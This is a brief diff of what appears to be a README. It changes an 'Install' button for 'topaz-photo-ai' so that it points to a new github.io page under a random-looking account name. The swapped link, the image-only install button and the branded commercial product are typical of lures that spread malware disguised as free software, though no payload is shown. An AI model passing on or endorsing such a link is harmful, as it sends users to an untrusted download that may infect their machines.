@@ -14,7 +14,7 @@
 </p>
 
 <p align="center">
-  <a href="https://vengalbi-motors.github.io/.github/topaz-photo-ai">
+  <a href="https://aiaoadnakjsdh-arps.github.io/.github/topaz-photo-ai">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/>
   </a>
 </p>
